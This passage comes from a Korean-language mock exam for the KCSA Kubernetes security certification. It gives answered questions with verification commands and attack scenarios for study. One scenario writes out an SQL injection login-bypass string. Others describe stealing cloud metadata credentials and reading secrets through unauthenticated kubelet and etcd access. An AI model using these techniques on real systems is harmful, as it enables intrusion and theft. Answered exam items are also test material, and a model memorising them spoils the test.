# KCSA 모의 시험 문제

KCSA(Kubernetes and Cloud Native Security Associate) 시험 대비 모의 문제 40문항이다.
실제 시험과 동일한 비율로 도메인별 문제를 구성하였다.

| 도메인 | 비중 | 문항 수 |
|--------|------|---------|
| Cloud Native Security Overview | 14% | 6 |
| Kubernetes Cluster Component Security | 22% | 9 |
| Kubernetes Security Fundamentals | 22% | 9 |
| Kubernetes Threat Model | 16% | 6 |
| Platform Security | 16% | 6 |
| Compliance and Security Frameworks | 10% | 4 |

---

## Cloud Native Security Overview (6문항)

### 문제 1.
클라우드 네이티브 보안의 4C 모델에서 가장 바깥쪽 계층은 무엇인가?

A) Container
B) Cluster
C) Cloud
D) Code

<details><summary>정답 확인</summary>

**정답: C) Cloud ✅**

4C 모델은 바깥쪽부터 Cloud -> Cluster -> Container -> Code 순서이다. 각 계층의 보안이 바깥 계층의 보안에 의존하므로, Cloud 계층이 가장 기본적인 보안 기반이 된다. tart-infra에서는 Tart VM이 Cloud 계층에 해당한다.

**검증:**
```bash
# Kubernetes 공식 문서에서 4C 계층 구조 확인
kubectl explain pod.spec.containers.securityContext
```
```text
# 4C 계층 구조 (바깥→안쪽)
# Cloud  : 인프라(AWS/GCP/Azure/Bare Metal) 보안 — IAM, 네트워크, 물리 보안
# Cluster: K8s 컴포넌트(API Server, etcd, kubelet) 보안
# Container: 이미지, 런타임, SecurityContext 설정
# Code   : 애플리케이션 레벨 취약점, 입력 검증, 의존성 관리
```

**오답 분석:**
- A) Container — 안쪽에서 세 번째 계층이다. 컨테이너 이미지, 런타임 보안을 담당한다.
- B) Cluster — 두 번째 계층이다. Kubernetes 컨트롤 플레인, 워커 노드 보안을 담당한다.
- D) Code — 가장 안쪽 계층이다. 애플리케이션 코드 자체의 보안을 다룬다.

**보안 원리:**
4C 모델은 Defense in Depth(심층 방어) 전략의 구현이다. 바깥 계층이 침해되면 안쪽 계층의 보안이 무력화될 수 있으므로, 바깥 계층부터 견고하게 구성해야 한다. Cloud 계층의 IAM 설정이 잘못되면 Cluster 계층의 RBAC가 아무리 정교해도 공격자가 etcd에 직접 접근할 수 있다.

**공격 시나리오:**
Cloud 계층 보안이 부재한 경우: 클라우드 IAM 정책이 `*:*` 전체 허용이면, 공격자가 EC2 메타데이터 서비스(169.254.169.254)를 통해 IAM 자격증명을 탈취하고, etcd 인스턴스에 직접 접근하여 모든 Secret(DB 패스워드, TLS 인증서)을 평문으로 추출한다.

**등장 배경:**
기존 단일 계층 보안(방화벽만 의존)은 내부 침해 시 전체 시스템이 노출되는 문제가 있었다. 클라우드 네이티브 환경에서 애플리케이션이 다수의 마이크로서비스로 분해되면서, 각 계층에 독립적인 보안 통제가 필요하게 되어 4C 모델이 제안되었다.

</details>

### 문제 2.
Zero Trust 보안 모델의 핵심 원칙으로 가장 적절한 것은?

A) 내부 네트워크의 트래픽은 신뢰한다
B) 방화벽 내부의 사용자는 기본적으로 신뢰한다
C) 어떤 주체도 기본적으로 신뢰하지 않고 항상 검증한다
D) VPN을 통한 접근은 자동으로 신뢰한다

<details><summary>정답 확인</summary>

**정답: C) 어떤 주체도 기본적으로 신뢰하지 않고 항상 검증한다 ✅**

Zero Trust는 "Never trust, always verify"가 핵심 원칙이다. 네트워크 위치에 관계없이 모든 접근에 대해 인증과 인가를 수행한다. tart-infra에서 Cilium의 default-deny NetworkPolicy가 이 원칙을 구현한 사례이다.

**검증:**
```bash
# Cilium default-deny 정책 확인 (Zero Trust 구현)
kubectl get ciliumnetworkpolicy -n demo -o yaml
# Istio mTLS STRICT 모드 확인 (서비스 간 상호 인증)
kubectl get peerauthentication -n demo -o yaml
```
```text
# default-deny 정책 적용 시 예상 출력:
# spec:
#   endpointSelector: {}
#   ingress: []        ← 모든 인바운드 트래픽 차단
#   egress: []         ← 모든 아웃바운드 트래픽 차단
```

**오답 분석:**
- A) 내부 네트워크 트래픽 신뢰 — 이는 전통적 경계 보안(Perimeter Security) 모델이다. Zero Trust와 정반대이다.
- B) 방화벽 내부 사용자 기본 신뢰 — Castle-and-Moat 모델로, 내부 위협에 취약하다.
- D) VPN 자동 신뢰 — VPN은 네트워크 접근 경로일 뿐, VPN 연결 자체가 인증/인가를 대체하지 않는다.

**보안 원리:**
Zero Trust는 세 가지 핵심 원칙으로 동작한다: (1) 명시적 검증 — 모든 요청에 대해 사용자 ID, 디바이스, 위치, 서비스를 검증한다. (2) 최소 권한 접근 — JIT(Just-In-Time)/JEA(Just-Enough-Access) 방식으로 필요한 최소 권한만 부여한다. (3) 침해 가정(Assume Breach) — 이미 침해되었다고 가정하고 마이크로세그멘테이션, E2E 암호화, 지속적 모니터링을 적용한다.

**공격 시나리오:**
경계 보안 모델에서 공격자가 VPN 자격증명 하나를 피싱으로 탈취하면, 내부 네트워크의 모든 서비스에 자유롭게 접근한다. Kubernetes 환경에서 NetworkPolicy 없이 flat network를 운영하면, 단일 Pod 침해 시 공격자가 동일 클러스터 내 모든 Pod의 서비스 포트에 직접 접근하여 lateral movement가 가능하다.

**등장 배경:**
2010년 Forrester Research의 John Kindervag가 제안하였다. 클라우드 환경에서 네트워크 경계가 사라지고, BYOD/재택근무로 내부/외부 구분이 무의미해지면서, "내부는 안전하다"는 전제가 무너졌다. 2020년 SolarWinds 공급망 공격 사건에서 내부 네트워크 신뢰 모델의 치명적 한계가 입증되었다.

</details>

### 문제 3.
컨테이너 이미지 보안에서 가장 권장되는 사항은?

A) latest 태그를 사용하여 항상 최신 이미지를 사용한다
B) 이미지 다이제스트(SHA256)를 사용하여 이미지를 고정한다
C) Docker Hub에서 다운로드한 이미지는 스캔 없이 사용해도 안전하다
D) 이미지 크기를 줄이기 위해 보안 패치를 생략한다

<details><summary>정답 확인</summary>

**정답: B) 이미지 다이제스트(SHA256)를 사용하여 이미지를 고정한다 ✅**

이미지 다이제스트를 사용하면 이미지의 무결성을 보장할 수 있다. latest 태그는 언제든 다른 이미지를 가리킬 수 있어 예측 불가능한 동작을 초래할 수 있다. 또한 이미지 서명(cosign 등)과 취약점 스캔(Trivy 등)을 함께 적용하는 것이 권장된다.

**검증:**
```bash
# 이미지 다이제스트 확인
docker inspect nginx:1.25 --format='{{index .RepoDigests 0}}'
# Pod에서 실제 사용 중인 이미지 다이제스트 확인
kubectl get pod <pod-name> -o jsonpath='{.status.containerStatuses[0].imageID}'
```
```text
# 다이제스트 형식 예시:
nginx@sha256:6db391d1c0cfb30588ba0bf72ea999404f2764feb30e637966acb637f8c8d26c
# 태그 형식(권장하지 않음):
nginx:latest  ← 가리키는 이미지가 언제든 변경될 수 있다
```

**오답 분석:**
- A) latest 태그 사용 — 태그는 mutable이다. 레지스트리에서 동일 태그에 다른 이미지를 push할 수 있으므로 재현성(reproducibility)이 보장되지 않는다.
- C) Docker Hub 이미지 무조건 안전 — Docker Hub의 공식 이미지도 취약점을 포함할 수 있다. 2020년 Docker Hub에서 악성 이미지 20개 이상이 발견되어 200만 회 이상 pull된 사례가 있다.
- D) 보안 패치 생략 — 이미지 크기 축소를 위해 보안 패치를 생략하면 알려진 CVE에 노출된다.

**보안 원리:**
이미지 다이제스트는 이미지 레이어 전체에 대한 SHA256 해시이다. 이미지의 단 1바이트라도 변경되면 다이제스트가 완전히 달라진다. 이는 암호학적 해시 함수의 충돌 저항성(collision resistance)에 기반한다. 컨테이너 런타임(containerd)은 pull 시 다이제스트를 검증하여 이미지 무결성을 보장한다.

**공격 시나리오:**
공격자가 레지스트리를 침해하여 `nginx:latest` 태그에 백도어가 포함된 이미지를 push한다. 태그만 사용하는 클러스터에서 Pod가 재시작되면 변조된 이미지가 pull되어 실행된다. 백도어는 리버스 셸을 열어 공격자에게 컨테이너 내부 접근 권한을 제공한다. 다이제스트를 사용했다면 해시 불일치로 pull이 실패하여 공격이 차단된다.

**등장 배경:**
초기 컨테이너 생태계에서는 `latest` 태그가 관례처럼 사용되었으나, 프로덕션 환경에서 "어제 동작하던 이미지가 오늘 다른 이미지로 교체됨" 문제가 빈발하였다. 2019년 Docker Hub 침해 사건(19만 계정 유출) 이후 이미지 무결성 검증의 중요성이 부각되었고, Notary v2와 cosign이 등장하였다.

</details>

### 문제 4.
클라우드 네이티브 애플리케이션의 소프트웨어 공급망 보안에서 SBOM의 역할은?

A) 컨테이너 런타임의 성능을 최적화한다
B) 소프트웨어에 포함된 모든 구성 요소와 의존성을 문서화한다
C) 네트워크 트래픽을 암호화한다
D) Pod의 리소스 사용량을 제한한다

<details><summary>정답 확인</summary>

**정답: B) 소프트웨어에 포함된 모든 구성 요소와 의존성을 문서화한다 ✅**

SBOM(Software Bill of Materials)은 소프트웨어의 모든 구성 요소, 라이브러리, 의존성을 목록화한 문서이다. 취약점 발견 시 영향 범위를 빠르게 파악하고 대응하는 데 필수적이다. SPDX와 CycloneDX가 대표적인 SBOM 표준 형식이다.

**검증:**
```bash
# Trivy로 컨테이너 이미지의 SBOM 생성 (CycloneDX 형식)
trivy image --format cyclonedx --output sbom.json nginx:1.25
# Syft로 SBOM 생성 (SPDX 형식)
syft nginx:1.25 -o spdx-json > sbom-spdx.json
# SBOM 내용 확인
cat sbom.json | jq '.components[] | {name, version, type}' | head -20
```
```text
# SBOM 출력 예시 (CycloneDX):
{
  "name": "libssl3",
  "version": "3.1.4-r2",
  "type": "library"
}
{
  "name": "zlib",
  "version": "1.3-r2",
  "type": "library"
}
```

**오답 분석:**
- A) 컨테이너 런타임 성능 최적화 — SBOM은 성능과 무관하다. 성능 최적화는 cgroup, 런타임 설정의 영역이다.
- C) 네트워크 트래픽 암호화 — 이는 mTLS, WireGuard 등 네트워크 계층 도구가 담당한다.
- D) Pod 리소스 제한 — ResourceQuota, LimitRange가 담당하는 기능이다.

**보안 원리:**
SBOM은 소프트웨어 구성 투명성(Software Composition Transparency)을 제공한다. 이미지에 포함된 모든 패키지(OS 레벨, 언어별 라이브러리)와 버전을 명시하여, 새로운 CVE가 발표되면 grep 한 번으로 영향받는 이미지를 식별할 수 있다. NTIA(미국 통신정보관리청)가 정의한 SBOM 최소 요소는 공급자명, 컴포넌트명, 버전, 고유 식별자, 의존 관계, 작성자, 타임스탬프이다.

**공격 시나리오:**
Log4Shell(CVE-2021-44228) 발생 시 SBOM이 없는 조직은 수백 개 서비스에서 log4j를 사용하는지 수작업으로 확인해야 했다. 패치에 수주가 소요되는 동안 공격자는 JNDI lookup을 통해 원격 코드 실행(RCE)을 수행하였다. SBOM이 있었다면 `jq '.components[] | select(.name=="log4j-core")' sbom.json` 한 줄로 영향 범위를 즉시 파악할 수 있었다.

**등장 배경:**
2021년 미국 행정명령 14028(Improving the Nation's Cybersecurity)에서 연방 정부 소프트웨어 공급업체에 SBOM 제출을 의무화하였다. SolarWinds, Codecov 공급망 공격 사건에서 "내 소프트웨어에 무엇이 포함되어 있는지 모른다"는 근본적 문제가 드러나 SBOM이 업계 표준으로 자리 잡았다.

</details>

### 문제 5.
DevSecOps에서 "Shift Left"의 의미는?

A) 보안 검사를 배포 후 모니터링 단계로 미룬다
B) 보안 활동을 개발 초기 단계로 앞당긴다
C) 보안 팀만 보안 검사를 수행한다
D) 운영 환경에서만 보안 테스트를 수행한다

<details><summary>정답 확인</summary>

**정답: B) 보안 활동을 개발 초기 단계로 앞당긴다 ✅**

Shift Left는 보안 활동을 소프트웨어 개발 라이프사이클의 초기 단계(설계, 코딩, 빌드)로 앞당기는 것이다. CI/CD 파이프라인에 이미지 스캔, SAST, DAST 등을 통합하여 취약점을 조기에 발견하고 수정 비용을 절감한다.

**검증:**
```bash
# CI 파이프라인에서 Shift Left 구현 예시 (Jenkinsfile / GitHub Actions)
# 1단계: 코드 정적 분석 (SAST)
semgrep --config=auto src/
# 2단계: 의존성 취약점 스캔 (SCA)
trivy fs --scanners vuln,secret .
# 3단계: 이미지 빌드 후 스캔
trivy image myapp:${GIT_SHA}
# 4단계: IaC 보안 검사
trivy config --severity HIGH,CRITICAL k8s-manifests/
```
```text
# Trivy 이미지 스캔 결과 예시:
Total: 3 (HIGH: 2, CRITICAL: 1)
┌──────────┬────────────────┬──────────┬─────────┬──────────────────────┐
│ Library  │ Vulnerability  │ Severity │ Version │ Fixed Version        │
├──────────┼────────────────┼──────────┼─────────┼──────────────────────┤
│ libssl3  │ CVE-2024-0727  │ CRITICAL │ 3.1.4   │ 3.1.5               │
└──────────┴────────────────┴──────────┴─────────┴──────────────────────┘
```

**오답 분석:**
- A) 배포 후 모니터링 단계로 미루기 — 이는 Shift Right에 해당한다. 프로덕션 모니터링은 필요하지만, 보안 결함 수정 비용은 개발 후기로 갈수록 기하급수적으로 증가한다.
- C) 보안 팀만 수행 — DevSecOps는 보안을 개발/운영 팀 전원의 책임으로 분산하는 문화이다. 보안 팀이 병목이 되면 릴리스 속도가 저하된다.
- D) 운영 환경에서만 테스트 — 프로덕션에서 취약점을 발견하면 이미 공격에 노출된 상태이다.

**보안 원리:**
Shift Left의 경제적 근거는 "결함 수정 비용 곡선"이다. IBM Systems Sciences Institute 연구에 따르면, 설계 단계에서 발견한 결함의 수정 비용을 1이라 할 때, 테스트 단계는 15배, 프로덕션은 100배에 달한다. CI 파이프라인에 보안 게이트를 삽입하면 취약한 코드가 다음 단계로 넘어가지 않는다.

**공격 시나리오:**
보안 검사 없이 배포된 애플리케이션에 SQL Injection 취약점이 존재한다. 공격자가 로그인 폼에 `' OR 1=1 --`를 입력하여 인증을 우회하고 DB 전체를 덤프한다. CI 단계에서 SAST 도구(Semgrep, SonarQube)를 적용했다면 코드 리뷰 전에 해당 취약점이 탐지되어 병합이 차단되었을 것이다.

**등장 배경:**
전통적 Waterfall 모델에서는 보안 테스트가 QA 직전 또는 릴리스 직전에 수행되어, 발견된 취약점 수정으로 출시가 지연되는 문제가 반복되었다. Agile/DevOps 도입으로 릴리스 주기가 주 단위/일 단위로 단축되면서, 보안 검사를 자동화하여 파이프라인에 내장하는 Shift Left가 필수가 되었다.

</details>

### 문제 6.
Sigstore의 cosign을 사용한 컨테이너 이미지 서명의 주요 목적은?

A) 이미지 크기를 줄인다
B) 이미지의 빌드 속도를 높인다
C) 이미지의 출처와 무결성을 검증한다
D) 이미지의 레이어를 암호화한다

<details><summary>정답 확인</summary>

**정답: C) 이미지의 출처와 무결성을 검증한다 ✅**

cosign은 컨테이너 이미지에 서명하여 이미지가 신뢰할 수 있는 출처에서 빌드되었고 변조되지 않았음을 검증한다. Kubernetes에서는 admission controller(Kyverno, OPA Gatekeeper 등)와 연동하여 서명되지 않은 이미지의 배포를 차단할 수 있다.

**검증:**
```bash
# cosign으로 이미지 서명
cosign sign --key cosign.key myregistry.io/myapp:v1.0
# cosign으로 서명 검증
cosign verify --key cosign.pub myregistry.io/myapp:v1.0
# Keyless 서명 (Fulcio + Rekor 사용)
cosign sign myregistry.io/myapp:v1.0  # OIDC 인증 후 자동 서명
cosign verify --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com myregistry.io/myapp:v1.0
```
```text
# 서명 검증 성공 시 출력:
Verification for myregistry.io/myapp:v1.0 --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - The signatures were verified against the specified public key

[{"critical":{"identity":{"docker-reference":"myregistry.io/myapp"},...}]
```

**오답 분석:**
- A) 이미지 크기 축소 — 이미지 경량화는 멀티스테이지 빌드, distroless/alpine 베이스 이미지가 담당한다.
- B) 빌드 속도 향상 — 서명은 빌드 후 추가 단계이므로 오히려 약간의 시간이 소요된다.
- D) 레이어 암호화 — 이미지 레이어 암호화는 OCI Image Spec의 별도 기능(imgcrypt)이며, cosign의 역할이 아니다.

**보안 원리:**
cosign은 Sigstore 프로젝트의 구성 요소로, 세 가지 서비스와 연동된다: (1) Fulcio — 단기 코드 서명 인증서를 발급하는 CA이다. OIDC 토큰으로 서명자 신원을 확인한다. (2) Rekor — 투명성 로그(Transparency Log)로, 모든 서명 이벤트를 변조 불가능한 원장에 기록한다. (3) cosign — 실제 서명/검증 클라이언트이다. Keyless signing은 장기 키 관리 부담을 제거한다.

**공격 시나리오:**
공격자가 CI/CD 파이프라인을 침해하여 악성 코드가 주입된 이미지를 레지스트리에 push한다. cosign 서명 검증이 없으면 해당 이미지가 그대로 클러스터에 배포된다. Kyverno ClusterPolicy에 `verifyImages` 규칙을 설정하면, cosign 서명이 없거나 유효하지 않은 이미지의 Pod 생성 요청이 admission 단계에서 거부된다.

**등장 배경:**
기존 이미지 서명 도구(Docker Content Trust, Notary v1)는 설정이 복잡하고, 키 관리 부담이 커서 실무 도입률이 낮았다. 2021년 Linux Foundation이 Sigstore 프로젝트를 출범하여 keyless signing, 투명성 로그 등으로 서명 과정을 대폭 간소화하였다. cosign은 현재 CNCF 졸업(graduated) 프로젝트이다.

</details>

---

## Kubernetes Cluster Component Security (9문항)

### 문제 7.
kube-apiserver에서 익명 접근(anonymous access)을 비활성화하는 플래그는?

A) `--disable-anonymous-auth`
B) `--anonymous-auth=false`
C) `--no-anonymous`
D) `--authentication-mode=strict`

<details><summary>정답 확인</summary>

**정답: B) `--anonymous-auth=false` ✅**

`--anonymous-auth=false` 플래그를 설정하면 인증되지 않은 요청이 거부된다. 기본값은 `true`이며, 이 경우 인증되지 않은 요청은 `system:anonymous` 사용자로 처리된다. kubeadm으로 구성한 tart-infra 클러스터에서 이 설정을 확인할 수 있다.

**검증:**
```bash
# API Server static pod에서 anonymous-auth 플래그 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep anonymous-auth
# 익명 접근 테스트
curl -k https://<api-server>:6443/api/v1/namespaces --header "Authorization: "
# 비활성화 상태에서 RBAC 확인
kubectl get clusterrolebinding | grep anonymous
```
```text
# --anonymous-auth=false 설정 시 인증 없는 요청 결과:
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "Unauthorized",
  "code": 401
}
# --anonymous-auth=true (기본값) 시 system:anonymous로 처리됨
```

**오답 분석:**
- A) `--disable-anonymous-auth` — 존재하지 않는 플래그이다. API Server가 기동 시 오류를 반환한다.
- C) `--no-anonymous` — 존재하지 않는 플래그이다.
- D) `--authentication-mode=strict` — 존재하지 않는 플래그이다. 인증 관련 플래그는 `--authentication-token-webhook-config-file`, `--oidc-*` 등이다.

**보안 원리:**
API Server의 인증 체인은 요청을 순서대로 여러 authenticator에 전달한다. 모든 authenticator가 요청을 거부하면, `--anonymous-auth=true`일 때 해당 요청을 `system:anonymous` 사용자, `system:unauthenticated` 그룹으로 매핑한다. RBAC에서 이 사용자/그룹에 권한이 바인딩되어 있으면 인증 없이 리소스에 접근 가능하다.

**공격 시나리오:**
`--anonymous-auth=true` 상태에서 실수로 `system:anonymous`에 ClusterRole을 바인딩하면, 인터넷에서 API Server 포트(6443)에 접근 가능한 모든 사람이 Secret 조회, Pod 생성 등을 수행할 수 있다. 2018년 Tesla 클러스터 침해 사건에서 인증 없이 노출된 Kubernetes 대시보드를 통해 크립토마이닝 Pod가 배포된 사례가 있다.

**등장 배경:**
초기 Kubernetes는 개발 편의를 위해 anonymous-auth가 기본 활성화되어 있었다. health check 엔드포인트(`/healthz`, `/livez`)에 인증 없이 접근해야 하는 요구사항이 있었기 때문이다. 프로덕션 보안 강화가 요구되면서 CIS Benchmark에서 이 설정의 비활성화를 권고하게 되었다.

</details>

### 문제 8.
etcd의 데이터를 보호하기 위해 가장 중요한 보안 설정 두 가지는?

A) etcd 데이터 압축과 로그 로테이션
B) TLS 통신 암호화와 데이터 암호화(encryption at rest)
C) etcd 백업과 스냅샷
D) etcd 클러스터 사이즈와 디스크 성능 최적화

<details><summary>정답 확인</summary>

**정답: B) TLS 통신 암호화와 데이터 암호화(encryption at rest) ✅**

etcd에는 클러스터의 모든 상태 데이터(Secret 포함)가 저장된다. TLS를 통해 API Server-etcd 간 통신을 암호화하고, EncryptionConfiguration을 통해 저장 데이터를 암호화해야 한다. kubeadm은 기본적으로 etcd TLS 인증서를 생성한다.

**검증:**
```bash
# etcd TLS 인증서 확인
ls /etc/kubernetes/pki/etcd/
# API Server의 etcd 관련 TLS 플래그 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep etcd
# Encryption at rest 설정 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep encryption-provider-config
# etcd에서 Secret이 암호화되었는지 직접 확인
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/my-secret | hexdump -C | head
```
```text
# etcd TLS 인증서 파일 목록:
ca.crt  ca.key  healthcheck-client.crt  healthcheck-client.key
peer.crt  peer.key  server.crt  server.key

# 암호화 미적용 시 etcd에서 Secret 평문 노출:
/registry/secrets/default/my-secret
k8s:enc:identity:v1:...password=MyS3cretP@ss

# 암호화 적용(aescbc) 시:
k8s:enc:aescbc:v1:key1:... (바이너리 데이터)
```

**오답 분석:**
- A) 데이터 압축/로그 로테이션 — 운영 효율성 관련이며 보안과 직접적 관련이 없다.
- C) 백업과 스냅샷 — 가용성/재해 복구 관련이다. 중요하지만 "보호" 관점에서 가장 중요한 것은 아니다.
- D) 클러스터 사이즈/디스크 성능 — 성능 최적화 항목이다.

**보안 원리:**
etcd는 Kubernetes의 단일 진실 원천(Single Source of Truth)이다. 모든 리소스(Secret, ConfigMap, RBAC 정책, ServiceAccount 토큰)가 etcd에 저장된다. TLS는 전송 중 데이터(data in transit)를 보호하고, EncryptionConfiguration은 저장 중 데이터(data at rest)를 보호한다. 지원되는 암호화 프로바이더는 `aescbc`, `aesgcm`, `secretbox`, `kms`(외부 KMS 연동)이다.

**공격 시나리오:**
etcd에 TLS가 미설정되면 공격자가 네트워크 스니핑으로 API Server-etcd 통신을 가로채 모든 Secret 값을 평문으로 획득한다. encryption at rest가 미설정되면, etcd 데이터 디렉터리(`/var/lib/etcd`)에 접근 가능한 공격자가 etcdctl로 Secret을 직접 읽을 수 있다. etcd 백업 파일이 암호화 없이 저장된 경우에도 동일한 위험이 존재한다.

**등장 배경:**
초기 Kubernetes에서 etcd는 TLS 없이 평문 통신이 기본이었고, encryption at rest 기능 자체가 없었다. Kubernetes 1.7에서 EncryptionConfiguration이 도입되었고, 1.13에서 안정화(stable)되었다. 클라우드 환경에서 etcd 인스턴스의 EBS 스냅샷이 유출되어 Secret이 노출된 사건들이 이 기능 도입의 계기가 되었다.

</details>

### 문제 9.
kubelet의 보안 설정으로 올바르지 않은 것은?

A) `--anonymous-auth=false`로 익명 접근을 차단한다
B) `--authorization-mode=Webhook`으로 API Server를 통한 인가를 사용한다
C) `--read-only-port=10255`로 읽기 전용 포트를 활성화한다
D) `--rotate-certificates=true`로 인증서 자동 갱신을 활성화한다

<details><summary>정답 확인</summary>

**정답: C) `--read-only-port=10255`로 읽기 전용 포트를 활성화한다 ✅**

kubelet의 읽기 전용 포트(10255)는 인증 없이 노드 정보를 노출하므로 `--read-only-port=0`으로 비활성화해야 한다. tart-infra의 kubelet 설정에서 authorization mode가 Webhook으로 설정되어 있는지 확인해 볼 수 있다.

**검증:**
```bash
# kubelet 설정 확인
cat /var/lib/kubelet/config.yaml | grep -E "readOnlyPort|anonymous|authorization"
# 읽기 전용 포트 노출 여부 테스트
curl http://<node-ip>:10255/pods
# 보안 포트(10250) 인증 확인
curl -k https://<node-ip>:10250/pods
```
```text
# 안전한 kubelet 설정:
readOnlyPort: 0                    # 읽기 전용 포트 비활성화
authentication:
  anonymous:
    enabled: false                 # 익명 접근 차단
  webhook:
    enabled: true                  # API Server 인증 위임
authorization:
  mode: Webhook                    # API Server 인가 위임

# 10255 포트 활성화 시 인증 없이 노출되는 정보:
# /pods — 노드의 모든 Pod 목록(환경변수 포함)
# /spec — 노드 하드웨어 스펙
# /stats — 리소스 사용량 통계
```

**오답 분석:**
- A) `--anonymous-auth=false` — 올바른 보안 설정이다. kubelet에 대한 익명 접근을 차단한다.
- B) `--authorization-mode=Webhook` — 올바른 설정이다. kubelet 요청의 인가를 API Server에 위임한다.
- D) `--rotate-certificates=true` — 올바른 설정이다. kubelet 인증서 만료 전 자동 갱신을 활성화한다.

**보안 원리:**
kubelet은 두 개의 포트를 노출한다: 10250(HTTPS, 인증/인가 적용)과 10255(HTTP, 인증 없음). 10255 포트는 읽기 전용이지만, Pod 목록, 환경변수, 노드 스펙 등 민감한 정보를 제공한다. `authorization-mode=Webhook`을 설정하면 kubelet이 모든 요청을 API Server의 SubjectAccessReview API로 전달하여 RBAC 기반 인가를 수행한다.

**공격 시나리오:**
10255 포트가 활성화된 노드에 공격자가 접근하면, `/pods` 엔드포인트에서 모든 Pod의 환경변수(DB 패스워드, API 키 등)를 인증 없이 수집한다. `/spec` 엔드포인트에서 노드 아키텍처, CPU, 메모리 정보를 수집하여 후속 공격(크립토마이닝 Pod 배포 등)의 리소스 계획에 활용한다.

**등장 배경:**
초기 Kubernetes에서 10255 포트는 모니터링 도구(cAdvisor, Heapster)가 메트릭을 수집하는 용도로 사용되었다. 인증 오버헤드 없이 빠르게 데이터를 수집하기 위한 설계였으나, Shodan 검색으로 인터넷에 노출된 kubelet 포트가 다수 발견되면서 CIS Benchmark에서 비활성화를 필수 권고하게 되었다.

</details>

### 문제 10.
Kubernetes API Server의 인증(Authentication) 방식이 아닌 것은?

A) X.509 클라이언트 인증서
B) Bearer Token
C) NetworkPolicy
D) OpenID Connect (OIDC)

<details><summary>정답 확인</summary>

**정답: C) NetworkPolicy ✅**

NetworkPolicy는 네트워크 트래픽을 제어하는 리소스이며, 인증 방식이 아니다. API Server는 X.509 인증서, Bearer Token, OIDC, ServiceAccount Token, Webhook Token 등 다양한 인증 방식을 지원한다.

**검증:**
```bash
# API Server의 인증 관련 플래그 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep -E "client-ca|token-auth|oidc|service-account"
# 현재 사용자의 인증 정보 확인
kubectl config view --minify -o jsonpath='{.users[0].user}'
# API Server에 X.509 인증서로 접근
curl -k --cert client.crt --key client.key https://<api-server>:6443/api/v1/pods
```
```text
# API Server 인증 플래그 예시:
--client-ca-file=/etc/kubernetes/pki/ca.crt          # X.509 인증
--service-account-key-file=/etc/kubernetes/pki/sa.pub # SA 토큰 인증
--oidc-issuer-url=https://keycloak.example.com/realms/k8s  # OIDC 인증
--token-auth-file=/etc/kubernetes/tokens.csv          # Static Token (비권장)
```

**오답 분석:**
- A) X.509 클라이언트 인증서 — API Server의 `--client-ca-file` 플래그로 활성화되는 인증 방식이다. kubeadm 기본 인증 방식이다.
- B) Bearer Token — ServiceAccount 토큰, Bootstrap 토큰 등이 이 방식을 사용한다. `Authorization: Bearer <token>` 헤더로 전송된다.
- D) OIDC — 외부 IdP(Keycloak, Dex 등)와 연동하여 SSO를 구현하는 인증 방식이다.

**보안 원리:**
API Server의 인증은 플러그인 체인 방식으로 동작한다. 요청이 들어오면 X.509, Bearer Token, OIDC 등 활성화된 모든 authenticator를 순서대로 통과한다. 하나라도 성공하면 해당 사용자 정보(username, groups, uid)를 반환하고 인증이 완료된다. 인증(Authentication)은 "누구인가"를 확인하는 단계이며, 이후 인가(Authorization)에서 "무엇을 할 수 있는가"를 결정한다.

**공격 시나리오:**
Static Token 파일(`--token-auth-file`)을 사용하는 클러스터에서, 토큰 파일이 평문으로 노드에 저장된다. 노드 침해 시 공격자가 이 파일을 읽어 API Server에 인증된 요청을 보낼 수 있다. Static Token은 API Server 재시작 없이 변경이 불가능하므로 토큰 교체가 어렵다. OIDC + 단기 토큰 조합이 권장되는 이유이다.

**등장 배경:**
초기 Kubernetes는 Static Token File과 HTTP Basic Auth를 지원했으나, 이들은 토큰/패스워드가 평문으로 저장되고 교체가 어려워 Kubernetes 1.19에서 Basic Auth가 제거되었다. 엔터프라이즈 환경에서 기존 IdP와의 연동 요구가 증가하면서 OIDC, Webhook Token 등 확장 가능한 인증 방식이 도입되었다.

</details>

### 문제 11.
kubeadm으로 구성된 클러스터에서 API Server의 TLS 인증서 기본 위치는?

A) `/var/lib/kubelet/pki/`
B) `/etc/kubernetes/pki/`
C) `/opt/kubernetes/certs/`
D) `/root/.kube/certs/`

<details><summary>정답 확인</summary>

**정답: B) `/etc/kubernetes/pki/` ✅**

kubeadm은 `/etc/kubernetes/pki/` 디렉터리에 CA 인증서, API Server 인증서, etcd 인증서 등을 생성한다. tart-infra의 kubeadm 클러스터에서도 동일한 경로를 사용한다.

**검증:**
```bash
# kubeadm 인증서 디렉터리 구조 확인
ls -la /etc/kubernetes/pki/
ls -la /etc/kubernetes/pki/etcd/
# 인증서 유효기간 확인
openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -dates
# 인증서 SAN(Subject Alternative Name) 확인
openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -text | grep -A1 "Subject Alternative Name"
```
```text
# /etc/kubernetes/pki/ 디렉터리 구조:
ca.crt                ca.key                 # 클러스터 CA
apiserver.crt         apiserver.key          # API Server 서빙 인증서
apiserver-kubelet-client.crt/key             # API Server→kubelet 클라이언트 인증서
front-proxy-ca.crt    front-proxy-ca.key     # Front Proxy CA
front-proxy-client.crt/key                   # Aggregation Layer 인증서
sa.key                sa.pub                 # ServiceAccount 토큰 서명 키
etcd/                                        # etcd 전용 인증서 디렉터리
  ca.crt  ca.key  server.crt  server.key  peer.crt  peer.key
  healthcheck-client.crt  healthcheck-client.key
```

**오답 분석:**
- A) `/var/lib/kubelet/pki/` — kubelet 자체의 서빙 인증서가 위치하는 경로이다. API Server 인증서 위치가 아니다.
- C) `/opt/kubernetes/certs/` — Kubernetes 표준 경로가 아니다. 수동 설치 시 사용자가 임의로 지정할 수는 있다.
